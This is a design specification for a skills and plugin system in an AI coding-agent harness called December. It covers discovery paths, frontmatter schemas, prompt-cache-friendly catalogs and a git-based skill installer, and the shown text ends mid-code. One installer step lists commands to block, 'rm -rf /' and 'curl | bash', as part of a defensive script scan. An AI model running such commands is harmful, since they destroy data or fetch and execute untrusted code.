# Architecture & Design: Extensible Skills & Capabilities System for the December Agent Harness

**Author:** Systems & Agent Architecture Research Team  
**Target System:** December Agent Core (`packages/agent`, `packages/shared`, `packages/tools`, `apps/cli`)  
**Status:** Architectural Specification & Technical Blueprint  
**Primary Reference Standard:** Google Antigravity Customization Architecture, Anthropic Claude Code, Modern Agentic RFCs  
**Date:** September 2026

---

## 1. Executive Summary & Fundamental Thesis

Autonomous software engineering agents must strike a difficult balance: they must be deeply specialized across diverse domain runbooks, frameworks, and workflows, while simultaneously maintaining a lean, high-velocity inference loop with rapid time-to-first-token (TTFT) and high KV cache hit rates.

In early agent designs, teams attempted to teach agents new procedures by appending instructions into a monolithic system prompt. In December's initial prototype (`packages/agent/src/harness/agent-harness.ts`), skills were introduced via a rudimentary mechanism:

```typescript
// packages/agent/src/harness/agent-harness.ts (Legacy Implementation)
private discoverSkills(): string[] {
    const skills: string[] = []
    const skillsFile = path.join(this.config.workspaceDir, '.december', 'skills.md')
    try {
        if (fs.existsSync(skillsFile)) {
            const content = fs.readFileSync(skillsFile, 'utf8').trim()
            if (content) skills.push(content)
        }
    } catch (e) {}
    return skills
}
```

This legacy approach presents critical architectural bottlenecks:

1. **Context Window Bloat & Attention Saturation**: Dumping full markdown files verbatim into the system prompt consumes thousands of tokens on every turn, pushes critical workspace instructions out of high-attention zones ("Lost in the Middle"), and inflates inference costs.
2. **Lack of Modularity & Structure**: Single-file concatenation cannot support isolated scripts, multi-file reference manuals, execution examples, or asset templates.
3. **No Dynamic Discovery or Precedence Hierarchy**: There is no support for layered configuration (workspace overrides > plugins > global user preferences > built-in standards).
4. **Ecosystem Incompatibility**: Developers using Google Antigravity (`agy`), Claude Code, or Codex cannot share their `.agents/skills` or runbooks without maintaining redundant files.
5. **Absence of Package Lifecycle Management**: Users have no standardized CLI tooling (`december skill add <repo>`, `december skill list`) to download, inspect, verify, and update community skills.

```
+--------------------------------------------------------------------------------------------------------------------+
|                                    DECEMBER NEXT-GEN SKILLS ARCHITECTURE                                           |
|                                                                                                                    |
|   +--------------------------+     +--------------------------+     +-------------------------------------------+  |
|   | Discovery & Precedence   |     | Progressive Disclosure   |     | Cross-Ecosystem Interoperability          |  |
|   | Engine                   |     | Catalog (KV Cache Guard) |     | (100% Google Antigravity & Claude Code)   |  |
|   | Workspace > Global > Core|     | ~50 Tokens/Skill Index   |     | Shared .agents/ & .december/ Trees        |  |
|   +------------+-------------+     +------------+-------------+     +---------------------+---------------------+  |
|                |                                |                                         |                        |
|                +--------------------------------+-----------------------------------------+                        |
|                                                 |                                                                  |
|                                                 v                                                                  |
|   +------------------------------------------------------------------------------------------------------------+   |
|   | Execution & Lifecycle Management                                                                           |   |
|   | CLI Downloader (Sparse Git / Shorthand) + Read Tools (read_file / read_skill) + Sandboxed Script Runner    |   |
|   +------------------------------------------------------------------------------------------------------------+   |
+--------------------------------------------------------------------------------------------------------------------+
```

### The Core Architectural Invariant

> **Skill Invariant**: A skill is **not** prompt text injected unconditionally into every inference turn. A skill is a **structured, on-demand procedure package** consisting of a lightweight trigger descriptor, an executable runbook (`SKILL.md`), and optional auxiliary assets (`scripts/`, `references/`, `examples/`).
>
> Skills are indexed in the static system prompt using a **compact catalog descriptor** (~40–60 tokens) to maintain KV prompt cache stability. The full procedural body is retrieved **just-in-time** via progressive disclosure when triggered by model intent or direct user slash command.

---

## 2. Primary-Source Deconstruction & Ecosystem Comparison

To establish an extensible, battle-tested standard for December, we analyze the primary sources of Google Antigravity's customization system, Anthropic Claude Code's extension architecture, and modern agent specifications.

### 2.1 Google Antigravity (`agy`) Customization Architecture

Antigravity implements one of the most mature agent extensibility engines in production. Based on direct inspection of `/home/chaitanya/.gemini/antigravity-cli/builtin/skills/agy-customizations/` and real-world plugin skills such as Ponytail (`/home/chaitanya/.gemini/config/plugins/ponytail/skills/ponytail/SKILL.md`):

#### 1. Directory Anatomy

Every skill is isolated within its own named folder inside a designated `skills/` directory:

```text
skills/<skill_name>/
├── SKILL.md          # Mandatory: Instructions with YAML frontmatter
├── scripts/          # Optional: Executable utilities and shell scripts
├── examples/         # Optional: Concrete before/after code samples
├── resources/        # Optional: Binary templates, assets, or configs
└── references/       # Optional: Heavy reference docs & API specifications
```

#### 2. YAML Frontmatter Specification

The entry file `SKILL.md` requires strict YAML frontmatter:

```markdown
---
name: ponytail
description: >
    Forces the laziest solution that actually works, simplest, shortest, most
    minimal. Channels a senior dev who has seen everything: question whether the
    task needs to exist at all (YAGNI), reach for the standard library before
    custom code, native platform features before dependencies.
argument-hint: '[lite|full|ultra]'
license: MIT
---
```

- **`name`**: Lowercase, hyphen-separated identifier matching the directory name.
- **`description`**: Phrased in **third-person** stating explicitly **what** the skill does and **when** the model must activate it. Antigravity guidelines state that the primary agent reads this description alone to decide whether to activate the skill.
- **`argument-hint`**: Optional argument string for slash command autocompletion.

#### 3. Discovery Traversal & Declared JSON Configurations

Antigravity scans both conventional directories and declared manifest files:

- **Upward Workspace Traversal**: Walks from current working directory (CWD) to repository root (detecting `.git`), looking for `.agents/`, `.agent/`, `_agents/`, or `_agent/`.
- **Global Machine Configuration**: Inspects `~/.gemini/config/skills/` and `~/.gemini/config/plugins/`.
- **Explicit Manifests (`skills.json` / `plugins.json`)**: Allows repository owners to register arbitrary directory paths, define inclusion/exclusion regex patterns, and inherit configurations from shared locations:

```json
{
    "inherits": [
        {
            "path": "/shared/team-skills/skills.json",
            "include_only": ["linter-.*", "deploy-.*"],
            "exclude": [".*-deprecated"]
        }
    ],
    "entries": [{ "path": "tools/internal-skills" }]
}
```

#### 4. Progressive Disclosure Mechanism

Antigravity injects only the skill catalog into the system prompt (`<skills>` block):

```xml
<skills>
You can use specialized 'skills' to help you with complex tasks. Each skill has a name and a description listed below.
...
If a skill seems relevant to your current task, you MUST read its SKILL.md instructions using view_file before proceeding.
...
Available skills:
- agy-customizations (/path/to/SKILL.md): Comprehensive guide...
- ponytail (/path/to/SKILL.md): Forces the laziest solution...
</skills>
```

The model then uses `view_file` on demand to fetch the full instructions only when needed.

---

### 2.2 Anthropic Claude Code Architecture

Anthropic Claude Code takes an ergonomics-first approach:

1. **Slash Commands (`.claude/commands/` or `.claude.json`)**: Users define prompt templates that expand inline upon typing `/command [args]`. Claude Code maps these directly to interactive user actions.
2. **Rules Hierarchy (`CLAUDE.md`)**: Contextual instructions discovered hierarchically from root to leaf folders, loaded unconditionally or scoped to directory trees.
3. **Subshell Execution**: Claude Code executes arbitrary scripts via PTY subshells, prompting the user for approval before running non-whitelisted bash operations.

---

### 2.3 Comprehensive Ecosystem Comparison Matrix

| Dimension               | Google Antigravity (`agy`)                                      | Anthropic Claude Code                         | Legacy December (`.december`)                                | Proposed December Target Specification                                                                   |
| :---------------------- | :-------------------------------------------------------------- | :-------------------------------------------- | :----------------------------------------------------------- | :------------------------------------------------------------------------------------------------------- |
| **Discovery Roots**     | `.agents/`, `.agent/`, `~/.gemini/config/`, built-ins           | `.claude/`, `CLAUDE.md`, global config        | Single static `.december/skills.md`                          | Unified: `.agents/`, `.december/`, `~/.config/december/`, `~/.gemini/config/`, built-ins                 |
| **Skill Layout**        | Modular directory (`SKILL.md`, `scripts/`, `references/`)       | Custom command files or markdown prompt       | Monolithic single `.md` file                                 | Full modular directory tree (`SKILL.md`, `scripts/`, `references/`, `examples/`)                         |
| **Manifest Spec**       | YAML frontmatter (`name`, `description`, `argument-hint`)       | Frontmatter or JSON commands                  | None (plain markdown text)                                   | YAML frontmatter + Zod/TypeBox validation (`name`, `description`, `argumentHint`, `model`, `tags`)       |
| **Context Loading**     | Progressive disclosure (Catalog injected; model reads via tool) | Static injection or on-demand slash expansion | Monolithic injection (entire file contents in system prompt) | **Strict Progressive Disclosure** (catalog in static prompt prefix, on-demand retrieval via `read_file`) |
| **Prompt Cache Impact** | Zero cache bust; fixed catalog prefix                           | High variance if rules change                 | Severe cache bust on file edit; context pollution            | **100% Stable KV Prefix**; alphabetical sorted catalog ensures deterministic prompt hash                 |
| **CLI Management**      | Internal plugin engine                                          | npm / npx integration                         | None                                                         | Dedicated CLI command suite: `december skill add/remove/list/info/create`                                |
| **Interoperability**    | Antigravity native                                              | Claude native                                 | December only                                                | **Bilingual**: Loads `.agents/` and `.december/` interchangeably                                         |

---

## 3. Current State Audit of December's Harness & Identified Gaps

To understand where architectural refactoring is needed, we audit December's existing source code:

### 3.1 `packages/agent/src/harness/agent-harness.ts`

- **Issue 1: Monolithic Read**: `discoverSkills()` performs a synchronous read of `.december/skills.md`. If a team documents 10 runbooks in that file (totaling 12,000 tokens), every single agent turn pays for those 12,000 tokens regardless of relevance.
- **Issue 2: Unstructured Prompt Concatenation**:
    ```typescript
    if (skills.length > 0) {
        finalPrompt += `\n\nAvailable Skills:\n${skills.join('\n')}`
    }
    ```
    This creates an unstructured text block between the base prompt and `<project_context>`, perturbing the prefix boundary and preventing clean token attribution.

### 3.2 `packages/shared/src/utils/token-decomposition.ts`

- **Issue: Naive String Matching**:
    ```typescript
    const skillsRegex =
        /Available Skills:\n([\s\S]*?)(?=(?:\n\n<project_context>|\n\nCurrent date:|$))/i
    ```
    The token decomposition utility extracts skills simply by splitting the capture group by newlines (`split('\n')`). It cannot identify individual skills by name, calculate per-skill token costs, or differentiate catalog overhead from full skill body payloads.

### 3.3 `packages/shared/src/custom-commands.ts`

- **Issue: Disconnect Between Commands and Skills**:
  December supports custom slash commands via `.december/commands.json` (and `~/.config/december/commands.json`). However, there is no bridge between skills and commands. If a developer installs a skill like `ponytail`, they must also manually declare a custom slash command in `commands.json` to enable `/ponytail` in the interactive TUI.

### 3.4 `apps/cli/src/args.ts` & `apps/cli/src/commands.ts`

- **Issue: Missing CLI Interface**:
  The CLI parser in `args.ts` lists:
  `const knownCommands = ['login', 'logout', 'init', 'update', 'doctor', 'auth', 'link', 'key']`
  There is currently no `skill` or `skills` subcommand registered.

---

## 4. Detailed Technical Specification: Discovery, Hierarchy & Precedence

December must provide a deterministic discovery engine capable of locating, resolving, and deduplicating skills across diverse local and global scopes.

```
                                  DISCOVERY & RESOLUTION PIPELINE

   +-------------------------------------------------------------------------------------------+
   | 1. WORKSPACE DISCOVERY (Walk up from CWD to Git Root)                                     |
   |    - .december/skills/<name>/SKILL.md          (Highest Priority)                         |
   |    - .agents/skills/<name>/SKILL.md            (Cross-compatible with Antigravity)        |
   |    - .december/plugins/*/skills/<name>/        (Workspace Plugins)                        |
   |    - .agents/plugins/*/skills/<name>/                                                     |
   +---------------------------------------------+---------------------------------------------+
                                                 |
                                                 v
   +-------------------------------------------------------------------------------------------+
   | 2. DECLARED MANIFEST RESOLUTION                                                           |
   |    - .december/skills.json & .agents/skills.json                                          |
   |    - Evaluate 'entries' (custom paths) & 'inherits' with include/exclude regex            |
   +---------------------------------------------+---------------------------------------------+
                                                 |
                                                 v
   +-------------------------------------------------------------------------------------------+
   | 3. USER GLOBAL CONFIGURATION                                                              |
   |    - ~/.config/december/skills/<name>/                                                    |
   |    - ~/.gemini/config/skills/<name>/           (Global Antigravity skills)                |
   |    - ~/.config/december/plugins/*/skills/<name>/                                          |
   |    - ~/.gemini/config/plugins/*/skills/<name>/                                            |
   |    - ~/.config/december/skills.json                                                       |
   +---------------------------------------------+---------------------------------------------+
                                                 |
                                                 v
   +-------------------------------------------------------------------------------------------+
   | 4. BUILT-IN SYSTEM SKILLS                                                                 |
   |    - @december/agent/builtin/skills/           (Base system runbooks & diagnostics)       |
   +---------------------------------------------+---------------------------------------------+
                                                 |
                                                 v
   +-------------------------------------------------------------------------------------------+
   | 5. PRECEDENCE DEDUPLICATION & VALIDATION                                                  |
   |    - Deduplicate by canonical 'name' (Workspace wins over Global, Global wins over Core)  |
   |    - Validate YAML Frontmatter via Schema                                                 |
   |    - Sort alphabetically for deterministic Prompt Cache hit rate                          |
   +-------------------------------------------------------------------------------------------+
```

### 4.1 Resolution Hierarchy Order

When skills share an identical `name`, the engine resolves collisions using the following strict priority order (higher overrides lower):

1. **Workspace Local Skills**: `.december/skills/<name>/` and `.agents/skills/<name>/` in the active repository.
2. **Workspace Declared Skills**: Explicit paths defined in `.december/skills.json` or `.agents/skills.json`.
3. **Workspace Plugins**: Bundled skills in `.december/plugins/*/skills/` and `.agents/plugins/*/skills/`.
4. **Global User Skills**: `~/.config/december/skills/<name>/` and `~/.gemini/config/skills/<name>/`.
5. **Global User Plugins**: `~/.config/december/plugins/*/skills/` and `~/.gemini/config/plugins/*/skills/`.
6. **Global Declared Skills**: Paths defined in `~/.config/december/skills.json`.
7. **Built-in Packaged Skills**: Bundled core capabilities distributed with December CLI.

### 4.2 File System Tree Specification

A standard December skill directory conforms to the following layout:

```text
skills/
└── docker-deploy/
    ├── SKILL.md                 # Primary instruction manual with YAML frontmatter
    ├── scripts/                 # Runnable scripts executed by the agent or user
    │   ├── preflight.sh
    │   └── healthcheck.py
    ├── references/              # Extended documentation read on-demand via read_file
    │   ├── compose-spec.md
    │   └── troubleshooting.md
    ├── examples/                # Reference configuration implementations
    │   ├── docker-compose.prod.yml
    │   └── Dockerfile.optimized
    └── resources/               # Templates and static assets
        └── nginx.conf.template
```

### 4.3 Skill Manifest Schema (`SKILL.md` Frontmatter)

Every `SKILL.md` must begin with a YAML frontmatter block validated against the following schema:

```yaml
---
name: docker-deploy
description: >-
    Prepares, builds, and validates multi-container Docker deployments.
    Use when the user asks to containerize services, configure docker-compose,
    or debug local container health.
argument-hint: '[dev|staging|prod]'
license: Apache-2.0
tags:
    - docker
    - devops
    - deployment
model:
    recommended: 'gemini-2.5-pro'
disable: false
dependencies:
    bins:
        - docker
        - docker-compose
---
```

#### TypeScript TypeBox Definition:

```typescript
import { Type, Static } from '@sinclair/typebox'

export const SkillFrontmatterSchema = Type.Object({
    name: Type.String({
        pattern: '^[a-z0-9-_]+$',
        description: 'Unique lowercase identifier for the skill',
    }),
    description: Type.String({
        description: 'Third-person explanation of what the skill does and when to activate it',
    }),
    argumentHint: Type.Optional(
        Type.String({
            description: 'Argument placeholder hint displayed during slash command autocomplete',
        })
    ),
    license: Type.Optional(Type.String()),
    tags: Type.Optional(Type.Array(Type.String())),
    model: Type.Optional(
        Type.Object({
            recommended: Type.Optional(Type.String()),
            temperature: Type.Optional(Type.Number()),
        })
    ),
    disable: Type.Optional(Type.Boolean({ default: false })),
    dependencies: Type.Optional(
        Type.Object({
            bins: Type.Optional(Type.Array(Type.String())),
            skills: Type.Optional(Type.Array(Type.String())),
        })
    ),
})

export type SkillFrontmatter = Static<typeof SkillFrontmatterSchema>
```

### 4.4 Declared Configuration Schema (`skills.json`)

To match Google Antigravity's `skills.json` specification:

```json
{
    "$schema": "https://december.sh/schemas/skills-config.json",
    "inherits": [
        {
            "path": "~/shared-devops/skills.json",
            "include_only": ["^k8s-.*$", "^terraform-.*$"],
            "exclude": [".*-legacy$"]
        }
    ],
    "entries": [
        {
            "path": "tools/internal-skills",
            "exclude": ["experimental-.*"]
        }
    ]
}
```

---

## 5. Token Economy, Progressive Disclosure & Cache Stability

### 5.1 The Mathematical Problem of Context Stuffing

Consider an active workspace with 15 installed skills. In a naive "prompt stuffing" model:

- Average length of a comprehensive `SKILL.md`: **1,800 tokens**
- Total context consumed per inference turn: $15 \times 1,800 = \mathbf{27,000\text{ tokens}}$
- Across a typical 40-turn coding session: $40 \times 27,000 = \mathbf{1,080,000\text{ redundant tokens}}$

Beyond financial cost and latency penalties, context stuffing introduces **Attention Degradation**:

1. **Lost in the Middle**: LLMs demonstrate U-shaped attention curves. When 27k tokens of procedural documentation sit in the middle of the system prompt, instructions for core security guardrails and workspace rules experience degraded compliance.
2. **Cache Thrashing**: If any single skill file is edited or updated during the session, the entire KV prompt cache prefix is invalidated.

### 5.2 The Progressive Disclosure Protocol

Under December's Progressive Disclosure Architecture, skills operate in a **two-phase activation lifecycle**:

```
+--------------------------------------------------------------------------------------------------+
| PHASE 1: COMPACT STATIC CATALOG (~40-60 TOKENS PER SKILL)                                        |
| Injected into Static Prompt Prefix (Identical across all turns -> 100% KV Cache Hit)             |
|                                                                                                  |
| <available_skills>                                                                               |
| - ponytail (/home/.../skills/ponytail/SKILL.md): Forces the laziest solution that works...       |
| - docker-deploy (/repo/.agents/skills/docker-deploy/SKILL.md): Containerizes apps...             |
| </available_skills>                                                                              |
+-------------------------------------------------+------------------------------------------------+
                                                  |
                                                  v
                              User Prompt matches Skill Trigger
                              (e.g., "Set up docker compose for local postgres")
                                                  |
                                                  v
+-------------------------------------------------+------------------------------------------------+
| PHASE 2: JUST-IN-TIME PROGRESSIVE DISCLOSURE                                                     |
| Option A: Autonomous Model Activation via 'read_file' Tool                                       |
| Model generates:                                                                                 |
| <thought>                                                                                        |
| The user is asking to containerize services. The 'docker-deploy' skill contains the runbook.    |
| I will read its instructions first.                                                              |
| </thought>                                                                                       |
| Tool Call: read_file(path="/repo/.agents/skills/docker-deploy/SKILL.md")                         |
|                                                                                                  |
| Option B: Explicit User Slash Command (/docker-deploy prod)                                      |
| CLI session automatically fetches SKILL.md and injects prompt into conversation turn             |
+--------------------------------------------------------------------------------------------------+
```

### 5.3 Deterministic System Prompt Construction & Caching

To guarantee prompt caching hits across Gemini, Anthropic Claude, and OpenAI providers, the catalog generation must satisfy **Prefix Invariance**:

1. Skills are ordered strictly by canonical `name` ascending (e.g., `[a-z]`).
2. Catalog strings use uniform markdown syntax.
3. Catalog is rendered before dynamic metadata (`Current date: ...`).

```xml
<skills>
You can use specialized 'skills' to help you with complex tasks. Each skill has a name and a description listed below.

If a skill seems relevant to your current task, you MUST read its SKILL.md instructions using read_file before proceeding. Do NOT assume you know the procedures without reading the file.

Available skills:
- agy-customizations (file:///home/user/.december/skills/agy-customizations/SKILL.md): Comprehensive guide and reference for customization systems.
- docker-deploy (file:///home/user/repo/.agents/skills/docker-deploy/SKILL.md): Prepares, builds, and validates multi-container Docker deployments.
- ponytail (file:///home/user/.gemini/config/plugins/ponytail/skills/ponytail/SKILL.md): Forces the laziest solution that actually works, simplest, shortest, most minimal.
</skills>
```

---

## 6. CLI Management & Custom Skills Downloader Architecture

A key requirement of the user request is the ability for developers to download, manage, and share skills effortlessly:
`december skill add <source>`

```
                               CLI PACKAGE MANAGER WORKFLOW

   december skill add phasehumans/december-skills/tree/main/skills/docker-deploy
                                      |
                                      v
   +----------------------------------------------------------------------+
   | Source URL Normalization & Detection                                 |
   | - Shorthand: github.com/owner/repo/tree/branch/path                  |
   | - Git Protocol: https://github.com/... or git@github.com:...         |
   | - Local Directory: file://... or /local/path                         |
   +----------------------------------+-----------------------------------+
                                      |
                                      v
   +----------------------------------------------------------------------+
   | Ingestion Strategy Execution                                         |
   |                                                                      |
   | [Primary]: Sparse Git Clone (Targeted subdirectory pull)             |
   |            git clone --filter=blob:none --sparse <remote> <tmp>      |
   |            git sparse-checkout set <relative_skill_path>             |
   |                                                                      |
   | [Fallback]: Raw Archive / GitHub API Tarball Stream                  |
   |             GET api.github.com/repos/.../tarball/...                 |
   +----------------------------------+-----------------------------------+
                                      |
                                      v
   +----------------------------------------------------------------------+
   | Validation & Security Verification                                   |
   | - Verify SKILL.md exists                                             |
   | - Parse & Validate YAML frontmatter (name, description)              |
   | - Scan scripts/ for blacklisted commands (rm -rf /, curl | bash)     |
   +----------------------------------+-----------------------------------+
                                      |
                                      v
   +----------------------------------------------------------------------+
   | Installation & Target Linking                                        |
   | Target: .december/skills/<name> (default) or .agents/skills/<name>   |
   | Flag --global: ~/.config/december/skills/<name>                      |
   +----------------------------------------------------------------------+
```

### 6.1 CLI Command Suite

The CLI will expose a dedicated subcommand group:

```bash
# 1. Add a skill from GitHub repository (sparse checkout)
december skill add phasehumans/december-skills/skills/docker-deploy

# 2. Add a skill globally for all projects
december skill add https://github.com/example/skills.git --skill terraform-aws --global

# 3. List all installed skills (with source origin and scope)
december skill list

# 4. Inspect detailed metadata of an installed skill
december skill info docker-deploy

# 5. Remove an installed skill
december skill remove docker-deploy

# 6. Scaffold a new skill template locally
december skill create my-custom-runbook
```

### 6.2 Remote Ingestion Algorithm (Sparse Git Checkout)

Monorepos containing hundreds of skills should not require cloning the entire git history. December implements an efficient sparse-checkout strategy:

```typescript
// apps/cli/src/skills/git-installer.ts
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import fs from 'node:fs/promises'
import path from 'node:path'
import os from 'node:os'

const execFileAsync = promisify(execFile)

export interface InstallSkillOptions {
    repoUrl: string
    subpath?: string
    targetDir: string
    skillName?: string
}

export async function installSkillViaGit(options: InstallSkillOptions): Promise<string> {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'december-skill-'))

    try {
        if (options.subpath) {
            // High-efficiency sparse clone: pull only the required subdirectory
            await execFileAsync('git', [
                'clone',
                '--filter=blob:none',
                '--no-checkout',
                '--depth=1',
                options.repoUrl,
                tmpDir,
            ])
            await execFileAsync('git', ['sparse-checkout', 'init', '--cone'], { cwd: tmpDir })
            await execFileAsync('git', ['sparse-checkout', 'set', options.subpath], { cwd: tmpDir })
            await execFileAsync('git', ['checkout'], { cwd: tmpDir })

            const extractedPath = path.join(tmpDir, options.subpath)
            const skillManifest = path.join(extractedPath, 'SKILL.md')
            await fs.access(skillManifest) // Validates SKILL.md exists

            const destName = options.skillName || path.basename(options.subpath)
            const destination = path.join(options.targetDir, destName)

            await fs.mkdir(options.targetDir, { recursive: true })
            await fs.cp(extractedPath, destination, { recursive: true })
            return destination
        } else {
            // Root-level skill repository
            await execFileAsync('git', ['clone', '--depth=1', options.repoUrl, tmpDir])
            const skillManifest = path.join(tmpDir, 'SKILL.md')
            await fs.access(skillManifest)

            const destName = options.skillName || path.basename(options.repoUrl, '.git')
            const destination = path.join(options.targetDir, destName)

            await fs.mkdir(options.targetDir, { recursive: true })
            await fs.cp(tmpDir, destination, { recursive: true })
            return destination
        }
    } finally {
        await fs.rm(tmpDir, { recursive: true, force: true }).catch(() => {})
    }
}
```

### 6.3 Shared Root with Google Antigravity (`.agents/`)

To fulfill the user's explicit request:

> _"like you can get and load all skills that are in .agents folder in root, and load it, like user can download custom skills and december cli can support it"_

December adopts a **bilingual directory strategy**:

- When reading skills, December searches `.december/skills` AND `.agents/skills` equally.
- When installing skills, if the workspace already contains an `.agents/` folder (standard for Antigravity workspaces), `december skill add` defaults to installing into `.agents/skills/<name>`.
- If only `.december/` exists, it installs into `.december/skills/<name>`.
- This ensures developers working across Antigravity and December CLI share a single source of truth without duplicated files or synchronization scripts.

---

## 7. Concrete TypeScript Implementation Blueprint

### 7.1 Type Definitions (`packages/shared/src/skills/types.ts`)

```typescript
export interface SkillMetadata {
    name: string
    description: string
    argumentHint?: string
    license?: string
    tags?: string[]
    model?: {
        recommended?: string
        temperature?: number
    }
    disable?: boolean
    dependencies?: {
        bins?: string[]
        skills?: string[]
    }
}

export type SkillOrigin =
    | 'workspace'
    | 'declared'
    | 'workspace-plugin'
    | 'global'
    | 'global-plugin'
    | 'builtin'

export interface DiscoveredSkill {
    name: string
    metadata: SkillMetadata
    directoryPath: string
    entryFilePath: string // Absolute path to SKILL.md
    origin: SkillOrigin
    scripts: string[]
    references: string[]
}

export interface SkillsConfigEntry {
    path: string
    include_only?: string[]
    exclude?: string[]
}

export interface SkillsConfigFile {
    inherits?: SkillsConfigEntry[]
    entries?: SkillsConfigEntry[]
}
```

### 7.2 Frontmatter Parser (`packages/shared/src/skills/parser.ts`)

```typescript
import fs from 'node:fs'
import path from 'node:path'
import yaml from 'yaml'
import { SkillMetadata } from './types'

export function parseSkillFile(skillMdPath: string): { metadata: SkillMetadata; body: string } {
    const rawContent = fs.readFileSync(skillMdPath, 'utf8')
    const frontmatterRegex = /^---\r?\n([\s\S]*?)\r?\n---\r?\n([\s\S]*)$/
    const match = rawContent.match(frontmatterRegex)

    if (!match) {
        throw new Error(
            `Invalid skill format: ${skillMdPath} lacks YAML frontmatter delimiters (---)`
        )
    }

    const [, frontmatterYaml, body] = match
    const parsed = yaml.parse(frontmatterYaml)

    if (!parsed || typeof parsed !== 'object') {
        throw new Error(`Failed to parse YAML frontmatter in ${skillMdPath}`)
    }

    if (!parsed.name || typeof parsed.name !== 'string') {
        throw new Error(`Skill in ${skillMdPath} is missing required 'name' field`)
    }

    if (!parsed.description || typeof parsed.description !== 'string') {
        throw new Error(`Skill in ${skillMdPath} is missing required 'description' field`)
    }

    const metadata: SkillMetadata = {
        name: parsed.name.toLowerCase().trim(),
        description: parsed.description.trim(),
        argumentHint: parsed['argument-hint'] || parsed.argumentHint,
        license: parsed.license,
        tags: Array.isArray(parsed.tags) ? parsed.tags : undefined,
        model: parsed.model,
        disable: Boolean(parsed.disable),
        dependencies: parsed.dependencies,
    }

    return { metadata, body: body.trim() }
}
```

### 7.3 Discovery Engine (`packages/shared/src/skills/discovery.ts`)

```typescript
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { DiscoveredSkill, SkillOrigin } from './types'
import { parseSkillFile } from './parser'

export class SkillDiscoveryEngine {
    private workspaceDir: string

    constructor(workspaceDir: string) {
        this.workspaceDir = path.resolve(workspaceDir)
    }

    public discoverAllSkills(): DiscoveredSkill[] {
        const skillMap = new Map<string, DiscoveredSkill>()

        // 1. Discover Built-in Skills (Lowest precedence)
        this.scanBuiltinSkills(skillMap)

        // 2. Discover Global User Skills
        this.scanGlobalSkills(skillMap)

        // 3. Discover Workspace Skills (Highest precedence, overrides global/builtin)
        this.scanWorkspaceSkills(skillMap)

        // Sort alphabetically by canonical name for prompt cache stability
        return Array.from(skillMap.values()).sort((a, b) => a.name.localeCompare(b.name))
    }

    private scanDirectoryForSkills(
        skillsDir: string,
        origin: SkillOrigin,
        map: Map<string, DiscoveredSkill>
    ) {
        if (!fs.existsSync(skillsDir)) return

        try {
            const entries = fs.readdirSync(skillsDir, { withFileTypes: true })
            for (const entry of entries) {
                if (!entry.isDirectory()) continue
                const skillDir = path.join(skillsDir, entry.name)
                const skillMdPath = path.join(skillDir, 'SKILL.md')

                if (fs.existsSync(skillMdPath)) {
                    try {
                        const { metadata } = parseSkillFile(skillMdPath)
                        if (metadata.disable) continue

                        const scriptsDir = path.join(skillDir, 'scripts')
                        const referencesDir = path.join(skillDir, 'references')

                        const scripts = fs.existsSync(scriptsDir)
                            ? fs.readdirSync(scriptsDir).map((f) => path.join(scriptsDir, f))
                            : []
                        const references = fs.existsSync(referencesDir)
                            ? fs.readdirSync(referencesDir).map((f) => path.join(referencesDir, f))
                            : []

                        // Put in map (higher precedence will overwrite lower because of scan order)
                        map.set(metadata.name, {
                            name: metadata.name,
                            metadata,
                            directoryPath: skillDir,
                            entryFilePath: skillMdPath,
                            origin,
                            scripts,
                            references,
                        })
                    } catch (err) {
                        // Swallowed: log warning or ignore malformed skill
                    }
                }
            }
        } catch (e) {
            // Swallowed: unreadable directory
        }
    }

    private scanWorkspaceSkills(map: Map<string, DiscoveredSkill>) {
        // Walk up from workspaceDir to Git root
        let currentDir = this.workspaceDir
        const roots: string[] = []

        while (true) {
            roots.push(currentDir)
            if (fs.existsSync(path.join(currentDir, '.git'))) break
            const parent = path.dirname(currentDir)
            if (parent === currentDir) break
            currentDir = parent
        }

        // Search in reverse order (root first, deepest last so child overrides parent)
        for (const root of roots.reverse()) {
            // .agents/skills (Antigravity standard)
            this.scanDirectoryForSkills(path.join(root, '.agents', 'skills'), 'workspace', map)
            // .december/skills (December standard)
            this.scanDirectoryForSkills(path.join(root, '.december', 'skills'), 'workspace', map)
            // .agent/skills
            this.scanDirectoryForSkills(path.join(root, '.agent', 'skills'), 'workspace', map)
        }
    }

    private scanGlobalSkills(map: Map<string, DiscoveredSkill>) {
        const home = os.homedir()
        // ~/.config/december/skills
        this.scanDirectoryForSkills(path.join(home, '.config', 'december', 'skills'), 'global', map)
        // ~/.gemini/config/skills (Antigravity global)
        this.scanDirectoryForSkills(path.join(home, '.gemini', 'config', 'skills'), 'global', map)
    }

    private scanBuiltinSkills(map: Map<string, DiscoveredSkill>) {
        const builtinDir = path.resolve(__dirname, '..', '..', 'builtin', 'skills')
        this.scanDirectoryForSkills(builtinDir, 'builtin', map)
    }
}
```

### 7.4 System Prompt Formatter (`packages/shared/src/skills/formatter.ts`)

```typescript
import { DiscoveredSkill } from './types'

export function formatSkillsCatalog(skills: DiscoveredSkill[]): string {
    if (skills.length === 0) return ''

    const lines = [
        '<skills>',
        "You can use specialized 'skills' to help you with complex tasks. Each skill has a name and a description listed below.",
        '',
        'If a skill seems relevant to your current task, you MUST read its SKILL.md instructions using read_file before proceeding. Do NOT assume you know the procedures without reading the file.',
        '',
        'Available skills:',
    ]

    for (const skill of skills) {
        const hint = skill.metadata.argumentHint ? ` (args: ${skill.metadata.argumentHint})` : ''
        lines.push(`- ${skill.name} (${skill.entryFilePath})${hint}: ${skill.metadata.description}`)
    }

    lines.push('</skills>')
    return lines.join('\n')
}
```

### 7.5 Updating `packages/agent/src/harness/agent-harness.ts`

```typescript
// Refactored AgentHarness initialization
import { SkillDiscoveryEngine, formatSkillsCatalog } from '@december/shared'

export class AgentHarness {
    private agent: Agent
    private config: HarnessConfig
    private skills: DiscoveredSkill[]

    constructor(config: HarnessConfig) {
        this.config = config

        // 1. Discover structured skills across workspace, plugins, and global scopes
        const discovery = new SkillDiscoveryEngine(config.workspaceDir)
        this.skills = discovery.discoverAllSkills()

        const systemPrompt = config.baseSystemPrompt || DEFAULT_BASE_SYSTEM_PROMPT
        const rules = this.discoverRules()

        // 2. Assemble final system prompt (Cache-preserving static ordering)
        let finalPrompt = `${systemPrompt}`

        // Ingest compact catalog (only ~40-60 tokens per skill)
        if (this.skills.length > 0) {
            finalPrompt += `\n\n${formatSkillsCatalog(this.skills)}`
        }

        if (rules.length > 0) {
